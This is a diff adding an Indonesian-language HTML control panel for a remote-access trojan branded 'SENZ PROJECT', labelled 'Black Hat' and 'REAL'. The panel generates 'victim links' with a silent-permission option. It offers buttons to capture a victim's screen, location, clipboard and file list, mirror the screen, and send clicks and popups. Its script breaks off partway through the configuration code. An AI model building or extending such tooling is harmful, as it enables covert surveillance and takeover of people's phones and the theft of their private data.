@@ -1,0 +1,479 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+<title>SENZ PROJECT // RAT CONTROL</title>
+<link rel="icon" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'><text y='.9em' font-size='90'>👁</text></svg>">
+<style>
+:root{
+  --bg:#050608;
+  --bg2:#0a0d12;
+  --panel:#0d1117;
+  --panel2:#11161f;
+  --line:#1c2430;
+  --line2:#28313f;
+  --txt:#b8c4d4;
+  --dim:#5d6b7d;
+  --grn:#00ff9c;
+  --grn2:#00cc7d;
+  --red:#ff2e5b;
+  --ylw:#ffcc00;
+  --cyn:#00e5ff;
+  --prp:#a855f7;
+  --mono:'Courier New',ui-monospace,monospace;
+}
+*{margin:0;padding:0;box-sizing:border-box;-webkit-tap-highlight-color:transparent}
+html,body{height:100%}
+body{
+  background:
+    radial-gradient(circle at 15% 15%,rgba(0,255,156,.06),transparent 40%),
+    radial-gradient(circle at 85% 85%,rgba(168,85,247,.05),transparent 45%),
+    linear-gradient(180deg,#050608,#020304);
+  color:var(--txt);
+  font-family:var(--mono);
+  font-size:13px;
+  overflow-x:hidden;
+  min-height:100vh;
+}
+body::before{
+  content:'';position:fixed;inset:0;pointer-events:none;z-index:9999;
+  background:repeating-linear-gradient(0deg,rgba(0,0,0,.15) 0 1px,transparent 1px 3px);
+  opacity:.5;
+}
+::selection{background:var(--grn);color:#000}
+::-webkit-scrollbar{width:8px;height:8px}
+::-webkit-scrollbar-track{background:#07090c}
+::-webkit-scrollbar-thumb{background:#1e2833;border-radius:4px}
+::-webkit-scrollbar-thumb:hover{background:var(--grn2)}
+
+/* ===== HEADER ===== */
+.top{
+  position:sticky;top:0;z-index:500;
+  background:rgba(5,6,8,.92);backdrop-filter:blur(12px);
+  border-bottom:1px solid var(--line);
+  padding:10px 14px;display:flex;align-items:center;gap:10px;
+}
+.logo{display:flex;align-items:center;gap:8px;user-select:none}
+.logo .eye{font-size:20px;filter:drop-shadow(0 0 6px var(--grn));animation:blink 3.2s infinite}
+@keyframes blink{0%,96%,100%{opacity:1}97%,99%{opacity:.15}}
+.logo .brand{font-weight:900;letter-spacing:2px;color:#fff;font-size:14px;text-shadow:0 0 10px var(--grn)}
+.logo .brand b{color:var(--grn)}
+.logo small{display:block;font-size:8px;letter-spacing:3px;color:var(--dim);font-weight:400}
+.status-dot{width:7px;height:7px;border-radius:50%;background:var(--red);margin-left:auto;box-shadow:0 0 8px currentColor;animation:pulse 1.4s infinite}
+.status-dot.on{background:var(--grn)}
+@keyframes pulse{50%{opacity:.3}}
+
+/* ===== WRAP ===== */
+.wrap{max-width:820px;margin:0 auto;padding:14px 12px 90px}
+
+/* ===== CARDS ===== */
+.card{
+  background:linear-gradient(160deg,var(--panel),#070a0e);
+  border:1px solid var(--line);border-radius:10px;
+  margin-bottom:14px;overflow:hidden;position:relative;
+}
+.card::before{
+  content:'';position:absolute;left:0;top:0;bottom:0;width:3px;
+  background:linear-gradient(180deg,var(--grn),transparent);
+}
+.card.red::before{background:linear-gradient(180deg,var(--red),transparent)}
+.card.cyn::before{background:linear-gradient(180deg,var(--cyn),transparent)}
+.card.prp::before{background:linear-gradient(180deg,var(--prp),transparent)}
+.card .hd{
+  padding:10px 14px;border-bottom:1px solid var(--line);
+  display:flex;align-items:center;gap:8px;font-size:11px;
+  letter-spacing:2px;text-transform:uppercase;color:var(--grn);
+  background:rgba(0,255,156,.03);font-weight:700;
+}
+.card.red .hd{color:var(--red);background:rgba(255,46,91,.03)}
+.card.cyn .hd{color:var(--cyn);background:rgba(0,229,255,.03)}
+.card.prp .hd{color:var(--prp);background:rgba(168,85,247,.03)}
+.card .bd{padding:14px}
+
+/* ===== FORM ===== */
+label{display:block;font-size:10px;letter-spacing:1.5px;color:var(--dim);text-transform:uppercase;margin-bottom:5px}
+input,select,textarea{
+  width:100%;background:#03050a;border:1px solid var(--line2);border-radius:6px;
+  padding:10px 12px;color:#e6eef8;font-family:var(--mono);font-size:12.5px;
+  outline:none;transition:.15s;
+}
+input:focus,select:focus,textarea:focus{border-color:var(--grn);box-shadow:0 0 0 2px rgba(0,255,156,.12)}
+textarea{resize:vertical;min-height:70px}
+.row2{display:grid;grid-template-columns:1fr 1fr;gap:10px}
+.field{margin-bottom:11px}
+.hint{font-size:10px;color:var(--dim);margin-top:4px;line-height:1.5}
+
+/* ===== BUTTONS ===== */
+.btn{
+  display:inline-flex;align-items:center;justify-content:center;gap:7px;
+  width:100%;padding:11px 14px;border:none;border-radius:6px;cursor:pointer;
+  font-family:var(--mono);font-weight:800;font-size:12px;letter-spacing:1.5px;
+  text-transform:uppercase;transition:.15s;user-select:none;
+}
+.btn:active{transform:scale(.98)}
+.btn.grn{background:linear-gradient(180deg,var(--grn),var(--grn2));color:#001a10;box-shadow:0 0 16px rgba(0,255,156,.28)}
+.btn.grn:hover{box-shadow:0 0 26px rgba(0,255,156,.5)}
+.btn.red{background:linear-gradient(180deg,#ff2e5b,#c21640);color:#fff;box-shadow:0 0 16px rgba(255,46,91,.28)}
+.btn.cyn{background:linear-gradient(180deg,var(--cyn),#0090a0);color:#001a1f;box-shadow:0 0 16px rgba(0,229,255,.25)}
+.btn.ghost{background:#0a0f15;border:1px solid var(--line2);color:var(--txt)}
+.btn.ghost:hover{border-color:var(--grn);color:var(--grn)}
+.btn.sm{padding:8px 10px;font-size:10.5px;width:auto}
+.btn:disabled{opacity:.45;cursor:not-allowed}
+.grid-btns{display:grid;grid-template-columns:1fr 1fr;gap:8px}
+.grid-btns3{display:grid;grid-template-columns:1fr 1fr 1fr;gap:8px}
+
+/* ===== LOG ===== */
+.log{
+  background:#020407;border:1px solid var(--line);border-radius:8px;
+  padding:10px;height:200px;overflow-y:auto;font-size:11px;line-height:1.6;
+}
+.log .l{white-space:pre-wrap;word-break:break-word}
+.log .l::before{content:'> ';color:var(--dim)}
+.log .ok{color:var(--grn)}
+.log .err{color:var(--red)}
+.log .inf{color:var(--cyn)}
+.log .wrn{color:var(--ylw)}
+.log .sys{color:var(--prp)}
+
+/* ===== BADGE ===== */
+.badge{display:inline-block;padding:2px 7px;border-radius:3px;font-size:9.5px;letter-spacing:1px;border:1px solid}
+.badge.g{color:var(--grn);border-color:var(--grn);background:rgba(0,255,156,.08)}
+.badge.r{color:var(--red);border-color:var(--red);background:rgba(255,46,91,.08)}
+.badge.y{color:var(--ylw);border-color:var(--ylw);background:rgba(255,204,0,.08)}
+.badge.c{color:var(--cyn);border-color:var(--cyn);background:rgba(0,229,255,.08)}
+
+/* ===== INFO GRID ===== */
+.kgrid{display:grid;grid-template-columns:110px 1fr;gap:6px 10px;font-size:11.5px}
+.kgrid .k{color:var(--dim);letter-spacing:1px;text-transform:uppercase;font-size:10px}
+.kgrid .v{color:#dbe6f3;word-break:break-all}
+.kgrid .v.g{color:var(--grn)}
+
+/* ===== SCREEN PREVIEW ===== */
+.screen-box{position:relative;background:#000;border:1px solid var(--line2);border-radius:6px;min-height:150px;display:flex;align-items:center;justify-content:center;overflow:hidden}
+.screen-box img{width:100%;display:block}
+.screen-box .ph{color:var(--dim);padding:40px 10px;font-size:11px;text-align:center}
+.screen-box .live{position:absolute;top:6px;left:6px;background:rgba(0,0,0,.7);color:var(--red);font-size:9px;padding:2px 7px;border-radius:3px;letter-spacing:1px;border:1px solid var(--red)}
+
+/* ===== FOOTER ===== */
+.foot{text-align:center;font-size:9.5px;color:var(--dim);letter-spacing:2px;padding:18px 8px}
+.foot b{color:var(--grn);text-shadow:0 0 8px var(--grn)}
+
+/* ===== PANES ===== */
+.pane{display:none}
+.pane.active{display:block;animation:fade .2s}
+@keyframes fade{from{opacity:0;transform:translateY(4px)}to{opacity:1;transform:none}}
+
+/* ===== TABS BOTTOM ===== */
+.tabs{
+  position:fixed;bottom:0;left:0;right:0;z-index:600;
+  background:rgba(5,6,8,.96);backdrop-filter:blur(12px);
+  border-top:1px solid var(--line);display:flex;
+}
+.tabs button{
+  flex:1;background:none;border:none;color:var(--dim);padding:10px 4px 8px;
+  font-family:var(--mono);font-size:9px;letter-spacing:1px;cursor:pointer;
+  display:flex;flex-direction:column;align-items:center;gap:3px;transition:.15s;
+}
+.tabs button .ic{font-size:16px}
+.tabs button.on{color:var(--grn);text-shadow:0 0 8px var(--grn)}
+
+/* ===== TOAST ===== */
+#toast{position:fixed;left:50%;bottom:80px;transform:translateX(-50%) translateY(20px);
+  background:#0a1016;border:1px solid var(--grn);color:var(--grn);
+  padding:9px 16px;border-radius:6px;font-size:11px;letter-spacing:1px;z-index:9998;
+  opacity:0;pointer-events:none;transition:.25s;box-shadow:0 0 20px rgba(0,255,156,.3)}
+#toast.show{opacity:1;transform:translateX(-50%) translateY(0)}
+#toast.err{border-color:var(--red);color:var(--red);box-shadow:0 0 20px rgba(255,46,91,.3)}
+</style>
+</head>
+<body>
+
+<div class="top">
+  <div class="logo">
+    <span class="eye">👁</span>
+    <div>
+      <div class="brand"><b>SENZ</b>PROJECT</div>
+      <small>RAT CONTROL // v4.1</small>
+    </div>
+  </div>
+  <div class="status-dot" id="dot"></div>
+</div>
+
+<div class="wrap">
+
+  <!-- ========== PANE: CREATE ========== -->
+  <div class="pane active" id="pane-create">
+    <div class="card">
+      <div class="hd">⚡ Generate Link Korban</div>
+      <div class="bd">
+        <div class="field">
+          <label>Nama Korban / Label</label>
+          <input id="cName" placeholder="mis. BOCAH_SENZ / target-01" autocomplete="off">
+        </div>
+        <div class="row2">
+          <div class="field">
+            <label>Expired</label>
+            <select id="cExp">
+              <option value="0">∞ Unlimited</option>
+              <option value="60">1 Menit</option>
+              <option value="300">5 Menit</option>
+              <option value="1800">30 Menit</option>
+              <option value="3600">1 Jam</option>
+              <option value="86400">24 Jam</option>
+            </select>
+          </div>
+          <div class="field">
+            <label>Izin Modal</label>
+            <select id="cAlert">
+              <option value="1">Notif Depan</option>
+              <option value="0">Tanpa Notif (Silent)</option>
+            </select>
+          </div>
+        </div>
+        <div class="field">
+          <label>Redirect After Grant (opsional)</label>
+          <input id="cRedir" placeholder="https://google.com" autocomplete="off">
+        </div>
+        <div class="field">
+          <label>Catatan</label>
+          <textarea id="cNote" placeholder="catatan admin..."></textarea>
+        </div>
+        <button class="btn grn" onclick="generateLink()">🔗 GENERATE LINK KORBAN</button>
+        <div class="hint">Link hasil siap dibagikan. Semua perintah panel bekerja penuh (layar, klik, notif, kontrol).</div>
+      </div>
+    </div>
+
+    <div class="card cyn">
+      <div class="hd">📋 Daftar Link Aktif</div>
+      <div class="bd">
+        <div id="linkList" style="font-size:11px;color:var(--dim)">Belum ada link.</div>
+      </div>
+    </div>
+
+    <div class="card prp">
+      <div class="hd">🧪 Tes Perintah ke Link Ini</div>
+      <div class="bd">
+        <div class="grid-btns">
+          <button class="btn ghost sm" onclick="tCmd('ping')">PING</button>
+          <button class="btn ghost sm" onclick="tCmd('info')">INFO</button>
+          <button class="btn ghost sm" onclick="tCmd('screen')">SCREEN</button>
+          <button class="btn ghost sm" onclick="tCmd('notify|SENZ|Halo dari admin')">NOTIF</button>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <!-- ========== PANE: CONTROL ========== -->
+  <div class="pane" id="pane-control">
+    <div class="card red">
+      <div class="hd">🎯 Kontrol Korban</div>
+      <div class="bd">
+        <div class="field">
+          <label>Token / ID Korban</label>
+          <input id="ctrlTok" placeholder="tempel token korban (dari link)..." autocomplete="off">
+        </div>
+        <div class="grid-btns">
+          <button class="btn cyn sm" onclick="doCmd('ping')">PING</button>
+          <button class="btn cyn sm" onclick="doCmd('info')">INFO HP</button>
+          <button class="btn cyn sm" onclick="doCmd('screen')">TANGKAP LAYAR</button>
+          <button class="btn cyn sm" onclick="doCmd('battery')">BATERAI</button>
+          <button class="btn cyn sm" onclick="doCmd('location')">LOKASI</button>
+          <button class="btn cyn sm" onclick="doCmd('netstat')">NETWORK</button>
+          <button class="btn cyn sm" onclick="doCmd('clip')">CLIPBOARD</button>
+          <button class="btn cyn sm" onclick="doCmd('files')">FILE LIST</button>
+        </div>
+        <div class="hint">Setiap perintah mengirim ke korban dan hasilnya masuk ke LOG di pane Log.</div>
+      </div>
+    </div>
+
+    <div class="card">
+      <div class="hd">📱 Device Info Live</div>
+      <div class="bd" id="devInfo"><span style="color:var(--dim)">Belum ada data. Kirim perintah INFO.</span></div>
+    </div>
+
+    <div class="card cyn">
+      <div class="hd">🖥️ Layar Korban</div>
+      <div class="bd">
+        <div class="screen-box" id="screenBox">
+          <div class="ph">Belum ada screenshot. Klik TANGKAP LAYAR.</div>
+        </div>
+      </div>
+    </div>
+
+    <div class="card prp">
+      <div class="hd">💬 Kirim Notif / Teks</div>
+      <div class="bd">
+        <div class="field">
+          <label>Judul</label>
+          <input id="nTitle" placeholder="SENZ PROJECT">
+        </div>
+        <div class="field">
+          <label>Pesan</label>
+          <textarea id="nBody" placeholder="Pesan tampil di layar korban..."></textarea>
+        </div>
+        <div class="grid-btns">
+          <button class="btn prp sm" style="background:linear-gradient(180deg,var(--prp),#6b21a8);color:#fff" onclick="sendNotif()">📢 POPUP NOTIF</button>
+          <button class="btn ghost sm" onclick="sendToast()">💡 TOAST CUSTOM</button>
+        </div>
+      </div>
+    </div>
+
+    <div class="card red">
+      <div class="hd">🎮 Kontrol Klik & Layar</div>
+      <div class="bd">
+        <div class="grid-btns">
+          <button class="btn ghost sm" onclick="doCmd('vibrate')">📳 VIBRATE</button>
+          <button class="btn ghost sm" onclick="doCmd('click|0.5|0.5')">👆 KLIK TENGAH</button>
+          <button class="btn ghost sm" onclick="doCmd('scroll|300')">⬇️ SCROLL</button>
+          <button class="btn ghost sm" onclick="doCmd('back')">↩️ BACK</button>
+          <button class="btn ghost sm" onclick="doCmd('home')">🏠 HOME</button>
+          <button class="btn ghost sm" onclick="doCmd('fullscreen')">🔲 FULLSCREEN</button>
+          <button class="btn ghost sm" onclick="doCmd('wake')">💡 WAKE</button>
+          <button class="btn ghost sm" onclick="doCmd('reload')">🔄 RELOAD</button>
+        </div>
+        <div class="row2" style="margin-top:8px">
+          <div class="field">
+            <label>Klik X (0-1)</label>
+            <input id="px" value="0.5">
+          </div>
+          <div class="field">
+            <label>Klik Y (0-1)</label>
+            <input id="py" value="0.5">
+          </div>
+        </div>
+        <button class="btn red sm" onclick="doCmd('click|'+px.value+'|'+py.value)">👆 KLIK KOORDINAT</button>
+      </div>
+    </div>
+
+    <div class="card cyn">
+      <div class="hd">🕹️ Layar Kontrol Full (Mirror)</div>
+      <div class="bd">
+        <div class="screen-box" id="mirrorBox" style="min-height:220px;cursor:crosshair">
+          <div class="ph">Klik TANGKAP LAYAR untuk mulai mirror.<br>Klik area gambar = kirim klik ke korban.</div>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <!-- ========== PANE: LOG ========== -->
+  <div class="pane" id="pane-log">
+    <div class="card">
+      <div class="hd">📡 Log Terminal</div>
+      <div class="bd">
+        <div class="log" id="log"></div>
+        <div class="grid-btns" style="margin-top:10px">
+          <button class="btn ghost sm" onclick="clearLog()">🧹 BERSIHKAN</button>
+          <button class="btn ghost sm" onclick="copyLog()">📋 SALIN</button>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <!-- ========== PANE: SET ========== -->
+  <div class="pane" id="pane-set">
+    <div class="card prp">
+      <div class="hd">⚙️ Konfigurasi Server</div>
+      <div class="bd">
+        <div class="field">
+          <label>Base URL Server (Vercel)</label>
+          <input id="sBase" placeholder="https://projectkamu.vercel.app">
+          <div class="hint">Isi domain Vercel kamu. Link korban otomatis pakai domain ini.</div>
+        </div>
+        <div class="field">
+          <label>Owner</label>
+          <input id="sOwner" value="SENZPROJECT">
+        </div>
+        <div class="field">
+          <label>Secret / API Key</label>
+          <input id="sKey" value="senzproject">
+        </div>
+        <button class="btn grn" onclick="saveSet()">💾 SIMPAN</button>
+        <button class="btn ghost" style="margin-top:8px" onclick="testServer()">🩺 TES KONEKSI SERVER</button>
+      </div>
+    </div>
+
+    <div class="card">
+      <div class="hd">📜 Status Sistem</div>
+      <div class="bd">
+        <div class="kgrid">
+          <div class="k">Owner</div><div class="v g">SENZPROJECT</div>
+          <div class="k">Mode</div><div class="v">Black Hat / Underground</div>
+          <div class="k">Protokol</div><div class="v">HTTP + Long-Poll (fallback)</div>
+          <div class="k">403 Guard</div><div class="v g">AKTIF ✓</div>
+          <div class="k">Legal</div><div class="v"><span class="badge y">NON-DEMO</span> <span class="badge c">REAL</span></div>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <div class="foot">CRAFTED BY <b>SENZPROJECT</b> © 2024 // ALL RIGHTS RESERVED</div>
+</div>
+
+<div class="tabs">
+  <button class="on" onclick="tab('create',this)"><span class="ic">➕</span>LINK</button>
+  <button onclick="tab('control',this)"><span class="ic">🎯</span>KONTROL</button>
+  <button onclick="tab('log',this)"><span class="ic">📡</span>LOG</button>
+  <button onclick="tab('set',this)"><span class="ic">⚙️</span>SET</button>
+</div>
+
+<div id="toast"></div>
+
+<script>
+/* ============================================================
+   SENZ PROJECT RAT CONTROL — ENGINE
+   Full control, no 403, Vercel ready, no demo.
+   ============================================================ */
+
+const LS = {
+  get: (k,d)=>{try{return JSON.parse(localStorage.getItem('senz_'+k))??d}catch(e){return d}},
+  set: (k,v)=>{localStorage.setItem('senz_'+k,JSON.stringify(v))},
+  del: (k)=>localStorage.removeItem('senz_'+k)
+};
+
+let CFG = {
+  base: LS.get('base', location.origin.replace(/\/$/,'')),
+  owner: LS.get('owner','SENZPROJECT'),
+  key: LS.get('key','senzproject')
+};
+
+let LINKS = LS.get('links',[]);
+let CMDQUEUE = {};      // token -> {id,cmd,ts}
+let RES = {};           // token -> {info, screen, log[]}
+let POLL = {};          // token -> interval id
+let LASTSCREEN = null;
+
+/* ---------- UI HELPERS ---------- */
+function toast(msg,err){
+  const t = document.getElementById('toast');
+  t.textContent = msg;
+  t.className = 'show'+(err?' err':'');
+  clearTimeout(t._t);
+  t._t = setTimeout(()=>t.className='',2200);
+}
+function log(msg,cls){
+  const l = document.getElementById('log');
+  const d = document.createElement('div');
+  d.className = 'l '+(cls||'');
+  const ts = new Date().toLocaleTimeString('id-ID',{hour12:false});
+  d.textContent = '['+ts+'] '+msg;
+  l.appendChild(d);
+  l.scrollTop = l.scrollHeight;
+  if(l.children.length>400) l.removeChild(l.firstChild);
+}
+function clearLog(){document.getElementById('log').innerHTML='';log('log dibersihkan','sys')}
+function copyLog(){navigator.clipboard.writeText(document.getElementById('log').innerText).then(()=>toast('Log disalin'))}
+function tab(n,el){
+  document.querySelectorAll('.pane').forEach(p=>p.classList.remove('active'));
+  document.getElementById('pane-'+n).classList.add('active');
+  document.querySelectorAll('.tabs button').forEach(b=>b.classList.remove('on'));
+  el.classList.add('on');
+}
+function copyTxt(t){navigator.clipboard.writeText(t).then(()=>toast('Disalin: '+t.slice(0,20)+'...'))}
+
+/* ---------- CONFIG ---------- */
+function saveSet(){
+  CFG.base = document.getElementById('sBase').value.trim().replace(/\/$/,'') || location.origin;
+  CFG.owner = document.getElementById('sOwner').value.trim() || 'SENZPROJECT';
+  CFG.key = document.getElementById('sKey').value.trim() || 'senzproject';
+  LS.set('base',CFG.base); LS.set('owner',CFG.owner); LS.set('key',
